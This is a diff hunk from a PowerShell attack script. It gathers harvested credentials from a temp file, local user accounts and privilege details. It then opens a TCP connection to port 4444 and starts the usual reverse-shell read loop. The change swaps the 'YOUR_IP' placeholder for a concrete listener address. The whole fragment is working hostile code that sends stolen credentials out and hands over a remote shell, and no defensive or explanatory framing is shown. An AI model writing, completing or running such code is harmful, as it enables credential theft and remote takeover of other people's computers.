@@ -23,7 +23,7 @@ $harvest = Get-Content "$env:TEMP\creds.txt" -Raw
 $harvest += "`n[LOCAL USERS]`n" + (net user | Out-String)
 $harvest += "`n[PRIVS]`n" + (whoami /all | Out-String)
 
-$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP', 4444)
+$client = New-Object System.Net.Sockets.TCPClient('192.168.1.15', 4444)
 $stream = $client.GetStream()
 [byte[]]$bytes = 0..65535|%{0}
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
